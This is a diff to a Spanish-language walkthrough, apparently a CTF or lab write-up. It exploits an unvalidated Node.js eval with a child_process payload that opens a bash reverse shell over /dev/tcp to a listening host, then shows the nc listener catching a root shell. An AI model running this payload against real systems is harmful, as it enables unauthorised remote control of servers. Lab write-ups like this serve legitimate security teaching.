@@ -731,3 +731,21 @@ Tenemos eval sin validar la entrada de user, un payload directo seria este:
 ``` bash 
 require('child_process').execSync('bash -c "bash -i >& /dev/tcp/192.168.136.105/4444 0>&1"')
 ```
+
+![img](./img/Captura3.png)
+
+
+Nos ponemos el listener y ejecutamos:
+
+``` bash
+
+❯ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.136.105] from (UNKNOWN) [10.114.163.190] 39590
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@de0610f51845:/usr/src/app#
+
+```
+
+
